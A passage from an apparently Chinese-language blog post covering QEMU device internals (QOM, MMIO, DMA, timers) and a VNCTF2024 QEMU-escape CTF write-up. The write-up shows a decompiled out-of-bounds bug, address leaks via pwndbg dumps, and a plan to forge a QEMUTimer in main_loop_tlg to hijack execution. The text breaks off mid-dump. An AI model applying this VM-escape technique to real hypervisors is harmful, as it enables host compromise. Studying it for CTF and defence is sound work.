class="string">&quot;edu-mmio&quot;</span>, <span class="number">1</span> * MiB);</span><br><span class="line">    <span class="built_in">pci_register_bar</span>(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;edu-&gt;mmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>QOM会为设备Object分配<code>instace_size</code>大小的空间，然后调用<code>instance_init</code>函数，instace 初始化使用 Object 作为参数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">edu_instance_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    EduState *edu = <span class="built_in">EDU</span>(obj);</span><br><span class="line"></span><br><span class="line">    edu-&gt;dma_mask = (<span class="number">1UL</span> &lt;&lt; <span class="number">28</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">object_property_add_uint64_ptr</span>(obj, <span class="string">&quot;dma_mask&quot;</span>,</span><br><span class="line">                                   &amp;edu-&gt;dma_mask, OBJ_PROP_FLAG_READWRITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="内存空间"><a href="#内存空间" class="headerlink" title="内存空间"></a>内存空间</h5><p>qemu使用 <strong>MemoryRegion</strong> 来表示对应的内存空间，相应的每一个 <strong>MemoryRegion</strong> 都有对应的 <strong>MemoryRegionOps</strong> 来描述其操做。</p>
<p>也就是注册 mmio 和 pmio</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps edu_mmio_ops = &#123;</span><br><span class="line">    .read = edu_mmio_read,</span><br><span class="line">    .write = edu_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">    .valid = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">4</span>,</span><br><span class="line">        .max_access_size = <span class="number">8</span>,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">memory_region_init_io</span><span class="params">(MemoryRegion *mr,</span></span></span><br><span class="line"><span class="params"><span class="function">                           Object *owner,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">const</span> MemoryRegionOps *ops,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">void</span> *opaque,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">const</span> <span class="type">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="type">uint64_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>

<h5 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h5><p>opaque是透明的，会出现一个类型转换为 <code>State</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ObjectClass *<span class="title">object_class_dynamic_cast_assert</span><span class="params">(ObjectClass *<span class="keyword">class</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *<span class="keyword">typename</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *file, <span class="type">int</span> line,</span></span></span><br><span class="line"><span class="params"><span class="function">                                              <span class="type">const</span> <span class="type">char</span> *func)</span></span></span><br></pre></td></tr></table></figure>

<h4 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h4><p>内存拷贝比较消耗CPU资源，定义一个专用的DMA设备帮助CPU做内存拷贝，CPU把数据的地址和需要拷贝到的目的地址</p>
<p>需要操作 GuestOS 物理内存，将虚拟内存地址转换为物理内存作为参数</p>
<p>write类似</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> MemTxResult <span class="title">pci_dma_read</span><span class="params">(PCIDevice *dev, <span class="type">dma_addr_t</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">                                       <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pci_dma_rw</span>(dev, addr, buf, len,</span><br><span class="line">                      DMA_DIRECTION_TO_DEVICE, MEMTXATTRS_UNSPECIFIED);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h4><p><a href="https://martins3.github.io/qemu/timer.html">QEMU 中的时钟</a></p>
<p>qemu支持四种时钟</p>
<ul>
<li>QEMU_CLOCK_REALTIME 不受虚拟系统的影响，随时间流逝而累加计数</li>
<li>QEMU_CLOCK_VIRTUAL 虚拟时钟，记录虚拟系统的时间滴答</li>
<li>QEMU_CLOCK_HOST 这个类似墙上时钟，修改宿主机系统时间会改变这个时间</li>
<li>QEMU_CLOCK_VIRTUAL_RT 在非icount模式下和QEMU_CLOCK_VIRTUAL，在icount模式下于QEMU_CLOCK_VIRTUAL不同的是在虚拟cpu休眠的时候该值也会累加</li>
</ul>
<p>如下为qemu初始化四种时钟，main_loop_tlg 是 main loop 的 QEMUTimerListGroup, 也是默认使用的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">    QEMU_CLOCK_REALTIME = <span class="number">0</span>,</span><br><span class="line">    QEMU_CLOCK_VIRTUAL = <span class="number">1</span>,</span><br><span class="line">    QEMU_CLOCK_HOST = <span class="number">2</span>,</span><br><span class="line">    QEMU_CLOCK_VIRTUAL_RT = <span class="number">3</span>,</span><br><span class="line">    QEMU_CLOCK_MAX</span><br><span class="line">&#125; QEMUClockType;</span><br><span class="line"></span><br><span class="line"><span class="built_in">init_clocks</span>(qemu_timer_notify_cb);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_clocks</span><span class="params">(QEMUTimerListNotifyCB *notify_cb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QEMUClockType type;</span><br><span class="line">    <span class="keyword">for</span> (type = <span class="number">0</span>; type &lt; QEMU_CLOCK_MAX; type++) &#123;</span><br><span class="line">        <span class="built_in">qemu_clock_init</span>(type, notify_cb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PRCTL_PR_SET_TIMERSLACK</span></span><br><span class="line">    <span class="built_in">prctl</span>(PR_SET_TIMERSLACK, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">qemu_clock_init</span><span class="params">(QEMUClockType type, QEMUTimerListNotifyCB *notify_cb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QEMUClock *clock = <span class="built_in">qemu_clock_ptr</span>(type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assert that the clock of type TYPE has not been initialized yet. */</span></span><br><span class="line">    <span class="built_in">assert</span>(main_loop_tlg.tl[type] == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    clock-&gt;type = type;</span><br><span class="line">    clock-&gt;enabled = (type == QEMU_CLOCK_VIRTUAL ? <span class="literal">false</span> : <span class="literal">true</span>);</span><br><span class="line">    clock-&gt;last = INT64_MIN;</span><br><span class="line">    <span class="built_in">QLIST_INIT</span>(&amp;clock-&gt;timerlists);</span><br><span class="line">    <span class="built_in">notifier_list_init</span>(&amp;clock-&gt;reset_notifiers);</span><br><span class="line">    main_loop_tlg.tl[type] = <span class="built_in">timerlist_new</span>(type, notify_cb, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> QEMUClock *<span class="title">qemu_clock_ptr</span><span class="params">(QEMUClockType type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;qemu_clocks[type];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> QEMUClock qemu_clocks[QEMU_CLOCK_MAX];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>qemu时钟：一个类型的 timer 都会插入到相同的 timerlist 上。在 <code>timerlist_run_timers()</code> 函数中存在 <code>cb(opaque)</code>调用。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimerListGroup</span> &#123;</span><br><span class="line">    QEMUTimerList *tl[QEMU_CLOCK_MAX];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QLIST_ENTRY(type)                                               \</span></span><br><span class="line"><span class="meta">struct &#123;                                                                \</span></span><br><span class="line"><span class="meta">        struct type *le_next;   <span class="comment">/* next element */</span>                      \</span></span><br><span class="line"><span class="meta">        struct type **le_prev;  <span class="comment">/* address of previous next element */</span>  \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimerList</span> &#123;</span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;</span><br><span class="line">    <span class="built_in">QLIST_ENTRY</span>(QEMUTimerList) list;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* lightweight method to mark the end of timerlist&#x27;s running */</span></span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QEMUTimer</span> &#123;</span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> attributes;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">timer_init_full</span><span class="params">(QEMUTimer *ts,</span></span></span><br><span class="line"><span class="params"><span class="function">                     QEMUTimerListGroup *timer_list_group, QEMUClockType type,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="type">int</span> scale, <span class="type">int</span> attributes,</span></span></span><br><span class="line"><span class="params"><span class="function">                     QEMUTimerCB *cb, <span class="type">void</span> *opaque)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h3><p>一种是使用gdb加载脚本，但是交互输出不是很直观 <code>gdb -x script</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file ./qemu-system-x86_64 </span><br><span class="line"><span class="built_in">set</span> args -L ./pc-bios \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0&quot;</span> \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio.gz \</span><br><span class="line">    -device vn \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null -s</span><br><span class="line"></span><br><span class="line">start</span><br><span class="line">brva 0x114514</span><br></pre></td></tr></table></figure>

<p>另一种是使用 gdb 连接到进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ps -af | grep qemu</span><br><span class="line">$ gdb -x script -p &lt;pid&gt;</span><br></pre></td></tr></table></figure>

<h2 id="VNCTF2024-escape-langlang-mountain2"><a href="#VNCTF2024-escape-langlang-mountain2" class="headerlink" title="VNCTF2024 escape_langlang_mountain2"></a>VNCTF2024 escape_langlang_mountain2</h2><p>存在符号表，找到其设备ID</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">vn_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">PCI_DEVICE_CLASS_23</span>(a1);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">176</span>) = pci_vn_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">184</span>) = <span class="number">0LL</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">208</span>) = <span class="number">0x1234</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">210</span>) = <span class="number">0x2024</span>;</span><br><span class="line">  *(_BYTE *)(result + <span class="number">212</span>) = <span class="number">0x10</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">214</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ~# lspci</span></span><br><span class="line"><span class="comment">// 00:01.0 Class 0601: 8086:7000</span></span><br><span class="line"><span class="comment">// 00:04.0 Class 00ff: 1234:2024</span></span><br></pre></td></tr></table></figure>

<p>mmio read&#x2F;write</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">vn_mmio_read</span><span class="params">(__int64 a1, __int64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">object_dynamic_cast_assert</span>(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">21LL</span>, <span class="string">&quot;vn_mmio_read&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(v4 + <span class="number">0xB80</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span> *)(*(<span class="type">int</span> *)(v4 + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">vn_mmio_write</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> __int64 val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="built_in">object_dynamic_cast_assert</span>(a1, <span class="string">&quot;vn&quot;</span>, <span class="string">&quot;../qemu-8.1.4/hw/misc/vnctf.c&quot;</span>, <span class="number">42LL</span>, <span class="string">&quot;vn_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(v5 + <span class="number">0xB84</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v5 + *(<span class="type">int</span> *)(v5 + <span class="number">0xB80</span>) + <span class="number">0xB40</span>LL) = val;</span><br><span class="line">      *(_DWORD *)(v5 + <span class="number">0xB84</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)val &lt;= <span class="number">0x3c</span> )</span><br><span class="line">        *(_DWORD *)(v5 + <span class="number">0xB80</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> &amp;&amp; <span class="built_in">HIDWORD</span>(val) &lt;= <span class="number">0x3C</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v5 + <span class="built_in">HIDWORD</span>(val) + <span class="number">0xB40</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个数组越界问题，int类型可以是负数。因此设置 <code>0xb80</code> 值为 <code>-0xb38/-0xb34</code> 读取 <code>g_free</code>，然后mmio_read泄露出libc_base。同样的方法可以泄露函数基地址，获得程序基址。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele <span class="number">0x563076e46c30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax <span class="number">0x563076e46c30</span> —▸ <span class="number">0x563075f58410</span> —▸ <span class="number">0x563075e16170</span> —▸ <span class="number">0x563075e162f0</span> ◂— <span class="number">0x6e76</span> <span class="comment">/* &#x27;vn&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x563076e46c38</span> —▸ <span class="number">0x7faffb78bd50</span> (g_free) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x563076e46c40</span> —▸ <span class="number">0x563076dfa5e0</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x563076e46c48</span> ◂— <span class="number">9</span> <span class="comment">/* &#x27;\t&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x563076e46c50</span> —▸ <span class="number">0x5630760bfaa0</span> —▸ <span class="number">0x563075ff81a0</span> —▸ <span class="number">0x563075e5f3b0</span> —▸ <span class="number">0x563075e5f530</span> ◂— ...</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x563076e46c58</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x563076e46c60</span> —▸ <span class="number">0x5630760c7550</span> ◂— <span class="string">&#x27;/machine/peripheral-anon/device[0]&#x27;</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x563076e46c68</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>


<p>如何进行执行流的劫持？</p>
<ul>
<li>看出题人WP <a href="https://github.com/xtxtn/vnctf2024-escape_langlang_mountain2wp">escape_langlang_mountain2 WP</a></li>
</ul>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit 1"></a>Exploit 1</h3><p>不依赖任何设备的函数，直接伪造QEMUTimerList和QEMUTimer，修改qemu的全局变量 main_loop_tlg 的成员变量值。等待QEMUTimer中的cb(opaque)去自动执行。在<code>timerlist_run_timers</code>函数中，<code>ts = timer_list-&gt;active_timers</code>，最后再去调用ts这个QEMUTimer中的cb(opaque)，那么直接修改<code>timer_list-&gt;active_timers</code>为一个伪造的QEMUTimer地址依然可以达到目的</p>
<p><a href="https://a1ex.online/2021/10/24/CVE-2019-6788-Qemu%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">CVE-2019-6788-Qemu逃逸漏洞复现与分析</a></p>
<p>MemoryRegion的结构体在缓冲区之上，通过设置好负数读取ops的地址就可以实现对qemu地址泄漏，读取opaque的地址也就知道vn设备在堆中的地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p &amp;main_loop_tlg</span><br><span class="line"><span class="variable">$5</span> = (&lt;data variable, no debug info&gt; *) 0x556d37e68480 &lt;main_loop_tlg&gt;</span><br><span class="line">pwndbg&gt; tele 0x556d37e68480</span><br><span class="line">00:0000│  0x556d37e68480 (main_loop_tlg) —▸ 0x556d3915d7c0 —▸ 0x556d37e684a0 (qemu_clocks) —▸ 0x556d3915dc70 ◂— 0x556d37e684a0</span><br><span class="line">01:0008│  0x556d37e68488 (main_loop_tlg+8) —▸ 0x556d3915d840 —▸ 0x556d37e684b0 (qemu_clocks+16) —▸ 0x556d3915dcf0 ◂— 0x556d37e684b0</span><br><span class="line">02:0010│  0x556d37e68490 (main_loop_tlg+16) —▸ 0x556d3915d8c0 —▸ 0x556d37e684c0 (qemu_clocks+32) —▸ 0x556d3915dd70 ◂— 0x556d37e684c0</span><br><span class="line">03:0018│  0x556d37e68498 (main_loop_tlg+24) —▸ 0x556d3915d940 —▸ 0x556d37e684d0 (qemu_clocks+48) —▸ 0x556d3915ddf0 ◂— 0x556d37e684d0</span><br><span class="line">04:0020│  0x556d37e684a0 (qemu_clocks) —▸ 0x556d3915dc70 ◂— 0x556d37e684a0</span><br><span class="line">05:0028│  0x556d37e684a8 (qemu_clocks+8) ◂— 0x100000000</span><br><span class="line">06:0030│  0x556d37e684b0 (qemu_clocks+16) —▸ 0x556d3915dcf0 ◂— 0x556d37e684b0</span><br><span class="line">07:0038│  0x556d37e684b8 (qemu_clocks+24) ◂— 0x100000001</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0x556d3a13bc30+0xb40-192</span><br><span class="line">00:0000│  0x556d3a13c6b0 —▸ 0x556d379071e0 (vn_mmio_ops) —▸ 0x556d36e0a458 (vn_mmio_read) ◂— endbr64</span><br><span class="line">01:0008│  0x556d3a13c6b8 —▸ 0x556d3a13bc30 —▸ 0x556d3924d410 —▸ 0x556d3910b170 —▸ 0x556d3910b2f0 ◂— ...</span><br><span class="line">02:0010│  0x556d3a13c6c0 —▸ 0x556d3945c840 —▸ 0x556d39200d80 —▸ 0x556d391523c0 —▸ 0x556d39152540 ◂— ...</span><br><span class="line">03:0018│  0x556d3a13c6c8 ◂— 0x0</span><br><span class="line">04:0020│  0x556d3a13c6d0 ◂— 0x1000</span><br><span class="line">05:0028│  0x556d3a13c6d8 ◂— 0x0</span><br><span class="line">06:0030│  0x556d3a13c6e0 ◂— 0xfebf1000</span><br><span class="line">07:0038│  0x556d3a13c6e8 —▸ 0x556d371da35b (memory_region_destructor_none) ◂— endbr64</span><br></pre></td></tr></table></figure>

<p>根据mmio_ops可以知道其下一个元素就是 opaque，也就是当前<code>VNState</code>的chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MemoryRegion</span> &#123;</span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> unmergeable;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line">    <span class="comment">/* owner as TYPE_DEVICE. Used for re-entrancy checks in MR access hotpath */</span></span><br><span class="line">    DeviceState *dev;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkinfo <span class="number">0x556d3a13bc30</span><span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : <span class="number">0x50</span></span><br><span class="line">size : <span class="number">0xba0</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>接下来就是如何伪造QEMUTimer了。调试，查看内存，发现<code>main_loop_tlg[1]</code> 存在 <code>active_timer</code>，可以修改这个 </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele <span class="number">0x555c4c77e480</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555c4c77e480</span> (main_loop_tlg) —▸ <span class="number">0x555c4dfb97c0</span> —▸ <span class="number">0x555c4c77e4a0</span> (qemu_clocks) —▸ <span class="number">0x555c4dfb9c70</span> ◂— <span class="number">0x555c4c77e4a0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555c4c77e488</span> (main_loop_tlg+<span class="number">8</span>) —▸ <span class="number">0x555c4dfb9840</span> —▸ <span class="number">0x555c4c77e4b0</span> (qemu_clocks+<span class="number">16</span>) —▸ <span class="number">0x555c4dfb9cf0</span> ◂— <span class="number">0x555c4c77e4b0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555c4c77e490</span> (main_loop_tlg+<span class="number">16</span>) —▸ <span class="number">0x555c4dfb98c0</span> —▸ <span class="number">0x555c4c77e4c0</span> (qemu_clocks+<span class="number">32</span>) —▸ <span class="number">0x555c4dfb9d70</span> ◂— <span class="number">0x555c4c77e4c0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x555c4c77e498</span> (main_loop_tlg+<span class="number">24</span>) —▸ <span class="number">0x555c4dfb9940</span> —▸ <span class="number">0x555c4c77e4d0</span> (qemu_clocks+<span class="number">48</span>) —▸ <span class="number">0x555c4dfb9df0</span> ◂— <span class="number">0x555c4c77e4d0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555c4c77e4a0</span> (qemu_clocks) —▸ <span class="number">0x555c4dfb9c70</span> ◂— <span class="number">0x555c4c77e4a0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555c4c77e4a8</span> (qemu_clocks+<span class="number">8</span>) ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555c4c77e4b0</span> (qemu_clocks+<span class="number">16</span>) —▸ <span class="number">0x555c4dfb9cf0</span> ◂— <span class="number">0x555c4c77e4b0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555c4c77e4b8</span> (qemu_clocks+<span class="number">24</span>) ◂— <span class="number">0x100000001</span></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>xg <span class="number">0x555c4dfb97c0</span></span><br><span class="line"><span class="number">0x555c4dfb97c0</span>: <span class="number">0x0000555c4c77e4a0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97d0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97e0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb97f0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x555c4dfb9800</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x000000004ef98770</span></span><br><span class="line"><span class="number">0x555c4dfb9810</span>: <span class="number">0x0000555c4dfb9cb8</span>      <span class="number">0x0000555c4b8bbeed</span></span><br><span class="line">pwndbg&gt; x/<span class="number">12</span>xg <span class="number">0x555c4dfb9840</span></span><br><span class="line"><span class="number">0x555c4dfb9840</span>: <span class="number">0x0000555c4c77e4b0</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9850</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9860</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9870</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000100000000</span></span><br><span class="line"><span class="number">0x555c4dfb9880</span>: <span class="number">0x0000555c4e28ee30</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555c4dfb9890</span>: <span class="number">0x0000555c4dfb9d38</span>      <span 